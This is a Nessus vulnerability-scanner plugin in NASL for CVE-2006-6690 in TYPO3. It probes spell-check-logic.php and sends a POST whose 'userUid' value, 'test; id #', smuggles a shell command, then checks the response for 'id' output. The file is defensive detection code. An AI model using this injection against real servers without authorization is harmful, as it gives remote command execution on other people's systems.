#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(23933);
  script_version("$Revision: 1.23 $");
  script_cvs_date("$Date: 2015/09/24 23:21:21 $");

  script_cve_id("CVE-2006-6690");
  script_bugtraq_id(21680);
  script_osvdb_id(30890);

  script_name(english:"TYPO3 'spell-check-logic.php' 'userUid' Parameter Arbitrary Command Execution");
  script_summary(english:"Attempts to run a command via TYPO3.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution.");
  script_set_attribute(attribute:"description", value:
"The remote host is running TYPO3, an open source content management
system written in PHP.

The version of TYPO3 installed on the remote host fails to sanitize
user-supplied input to the 'userUid' parameter before using it in the
'spell-check-logic.php' script to execute a command. An
unauthenticated, remote attacker can leverage this flaw to execute
arbitrary code on the remote host subject to the privileges of the web
server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/454944/30/0/threaded");
  # http://web.archive.org/web/20101130154927/http://typo3.org/teams/security/security-bulletins/typo3-20061220-1/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ea65af02");
  script_set_attribute(attribute:"solution", value:"Upgrade to TYPO3 version 4.0.4 / 4.1beta2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/12/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/12/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:typo3:typo3");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("typo3_detect.nasl");
  script_require_keys("installed_sw/TYPO3", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

app = "TYPO3";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(qs:dir, port:port);

foreach subdir (make_list("sysext", "ext"))
{
  # Check whether the affected script exists.
  url = dir + "/typo3/" + subdir +
    "/rtehtmlarea/htmlarea/plugins/SpellChecker/spell-check-logic.php";

  w = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
  res = w[2];

  # If it does...
  if ("var spellcheck_info" >< res)
  {
    cmd = "id";
    exploit =
    postdata =
      "psell_mode=fast&" +
      "to_p_dict=1&" +
      "cmd=learn&" +
      "userUid=" + urlencode(str:"test; id #") + "&" +
      "enablePersonalDicts=true";

    w = http_send_recv3(
      method:"POST",
      item: url+"?id=1",
      port: port,
      content_type: "application/x-www-form-urlencoded",
      data: postdata,
      exit_on_fail: TRUE
    );
    res = w[2];

    # There's a problem if we see output from our command.
    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      if (report_verbosity)
      {
        report =
          '\n' +
          'Nessus was able to execute the command "' + cmd + '" on the remote host.\n' +
          'It produced the following output :\n' +
          '\n' +
          '  ' + line;
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
